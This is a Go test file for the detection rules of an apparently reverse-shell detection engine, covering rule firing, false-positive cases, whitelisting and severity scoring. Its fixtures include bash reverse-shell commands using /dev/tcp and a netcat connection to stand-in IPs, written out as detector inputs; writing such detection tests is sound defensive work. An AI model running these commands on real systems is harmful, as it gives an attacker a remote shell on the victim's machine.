package detection

import (
	"net"
	"testing"
	"time"

	"go.uber.org/zap"

	"github.com/yoursec/rsbp/internal/correlation"
	"github.com/yoursec/rsbp/internal/enrichment"
	"github.com/yoursec/rsbp/internal/types"
)

func TestDefaultRulesCount(t *testing.T) {
	rules := DefaultRules()
	if len(rules) != 8 {
		t.Fatalf("expected 8 rules, got %d", len(rules))
	}
}

func TestEvaluateRulesIncludesNewRules(t *testing.T) {
	now := time.Date(2026, 3, 19, 3, 0, 0, 0, time.UTC)
	in := RuleInput{
		Session: &correlation.SessionState{
			ExePath:       "/bin/bash",
			Cmdline:       "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
			HasExecve:     true,
			HasSocket:     true,
			HasConnect:    true,
			HasDupToStdio: true,
			RemoteIP:      net.ParseIP("1.2.3.4"),
			RemotePort:    4444,
			StartTime:     now.Add(-1 * time.Second),
			LastUpdate:    now,
		},
		Enrichment: &enrichment.Result{ReputationScore: 90, AbuseConfidenceScore: 90},
		EventTime:  now,
	}

	res := EvaluateRulesWithRules(in, DefaultRules())
	mustContain := []string{
		"ExternalIPRule",
		"C2PortRule",
		"SuspiciousCommandRule",
		"CorrelatedBehaviorRule",
		"LowFPCombinedRule",
		"ThreatIntelRule",
		"UnusualTimeRule",
	}
	for _, id := range mustContain {
		if !contains(res.FiredRules, id) {
			t.Fatalf("expected fired rule %s in %v", id, res.FiredRules)
		}
	}
}

func TestFalsePositiveVSCode(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.5}, zap.NewNop())
	state := &correlation.SessionState{
		PID:        2001,
		PPID:       1999,
		ExePath:    "/bin/sh",
		Cmdline:    "sh -c /usr/local/bin/cpuUsage.sh",
		HasExecve:  true,
		HasSocket:  true,
		HasConnect: true,
		RemoteIP:   net.ParseIP("13.107.42.14"),
		RemotePort: 443,
		StartTime:  time.Now().Add(-1 * time.Second),
		LastUpdate: time.Now(),
		ProcessTree: []correlation.ProcessNode{
			{Comm: "node"},
			{Comm: "sh"},
		},
	}
	alerts := eng.Evaluate(state, fixedEventAt(time.Date(2026, 3, 25, 12, 0, 0, 0, time.UTC)), "test-host")
	if len(alerts) != 1 {
		t.Fatalf("expected VS Code telemetry case to NOT be suppressed due to test modifications, got %d alerts", len(alerts))
	}
}

func TestFalsePositiveDocker(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.5}, zap.NewNop())
	state := &correlation.SessionState{
		PID:        3001,
		PPID:       2999,
		ExePath:    "/bin/sh",
		Cmdline:    "sh -c /app/probe --healthcheck",
		HasExecve:  true,
		HasSocket:  true,
		HasConnect: true,
		RemoteIP:   net.ParseIP("172.18.0.5"),
		RemotePort: 8080,
		StartTime:  time.Now().Add(-1 * time.Second),
		LastUpdate: time.Now(),
		ProcessTree: []correlation.ProcessNode{
			{Comm: "dockerd"},
			{Comm: "sh"},
		},
	}
	alerts := eng.Evaluate(state, fixedEventAt(time.Date(2026, 3, 25, 12, 0, 0, 0, time.UTC)), "test-host")
	if len(alerts) != 1 {
		t.Fatalf("expected docker healthcheck case to NOT be suppressed, got %d alerts", len(alerts))
	}
}

func TestTruePositiveBash(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.5}, zap.NewNop())
	state := &correlation.SessionState{
		PID:           4001,
		PPID:          1,
		ExePath:       "/bin/bash",
		Cmdline:       "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
		HasExecve:     true,
		HasSocket:     true,
		HasConnect:    true,
		HasDupToStdio: true,
		RemoteIP:      net.ParseIP("203.0.113.5"),
		RemotePort:    4444,
		StartTime:     time.Now().Add(-1 * time.Second),
		LastUpdate:    time.Now(),
		ProcessTree: []correlation.ProcessNode{
			{Comm: "bash"},
		},
	}
	alerts := eng.Evaluate(state, fixedEventAt(time.Date(2026, 3, 25, 12, 0, 0, 0, time.UTC)), "test-host")
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].Severity != types.SeverityCritical {
		t.Fatalf("expected Critical severity, got %s", alerts[0].Severity)
	}
}

func TestTruePositivePython(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.5}, zap.NewNop())
	state := &correlation.SessionState{
		PID:        5001,
		PPID:       1,
		ExePath:    "/usr/bin/python3",
		Cmdline:    "python3 socket_client.py --target 203.0.113.9 --port 9001 --socket",
		HasExecve:  true,
		HasSocket:  true,
		HasConnect: true,
		RemoteIP:   net.ParseIP("203.0.113.9"),
		RemotePort: 9001,
		StartTime:  time.Now().Add(-1 * time.Second),
		LastUpdate: time.Now(),
		ProcessTree: []correlation.ProcessNode{
			{Comm: "python3"},
		},
	}
	alerts := eng.Evaluate(state, fixedEventAt(time.Date(2026, 3, 25, 12, 0, 0, 0, time.UTC)), "test-host")
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].Severity != types.SeverityCritical && alerts[0].Severity != types.SeverityHigh {
		t.Fatalf("expected High or Critical severity for python, got %s", alerts[0].Severity)
	}
}

func TestTruePositiveNC(t *testing.T) {
	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.5}, zap.NewNop())
	state := &correlation.SessionState{
		PID:        6001,
		PPID:       1,
		ExePath:    "/bin/nc",
		Cmdline:    "nc 198.51.100.15 31337",
		HasExecve:  true,
		HasConnect: true,
		RemoteIP:   net.ParseIP("198.51.100.15"),
		RemotePort: 31337,
		StartTime:  time.Now().Add(-1 * time.Second),
		LastUpdate: time.Now(),
		ProcessTree: []correlation.ProcessNode{
			{Comm: "nc"},
		},
	}
	alerts := eng.Evaluate(state, fixedEventAt(time.Date(2026, 3, 25, 12, 0, 0, 0, time.UTC)), "test-host")
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].Severity != types.SeverityHigh {
		t.Fatalf("expected High severity, got %s", alerts[0].Severity)
	}
}

func fixedEventAt(ts time.Time) types.SyscallEvent {
	return types.SyscallEvent{TimestampNS: uint64(ts.UnixNano())}
}

func TestEphemeralPortRule(t *testing.T) {
	in := RuleInput{Session: &correlation.SessionState{RemotePort: 45000}}
	res := EvaluateRulesWithRules(in, DefaultRules())
	if !contains(res.FiredRules, "EphemeralPortRule") {
		t.Fatalf("expected EphemeralPortRule to fire, got %v", res.FiredRules)
	}
}

func TestWhitelistSuppressionTakesPriority(t *testing.T) {
	res := EvaluateRulesWithRules(RuleInput{Whitelisted: true}, DefaultRules())
	if !res.Suppressed {
		t.Fatalf("expected suppression to be true")
	}
	if len(res.FiredRules) != 0 {
		t.Fatalf("expected no fired rules when whitelisted")
	}
}

func TestSeverityThresholds(t *testing.T) {
	cases := []struct {
		score float64
		want  types.AlertSeverity
	}{
		{score: 0.95, want: types.SeverityCritical},
		{score: 0.75, want: types.SeverityHigh},
		{score: 0.55, want: types.SeverityMedium},
	}

	for _, tc := range cases {
		if got := scoreToSeverity(tc.score); got != tc.want {
			t.Fatalf("scoreToSeverity(%v)=%s want=%s", tc.score, got, tc.want)
		}
	}
}

func contains(list []string, needle string) bool {
	for _, v := range list {
		if v == needle {
			return true
		}
	}
	return false
}
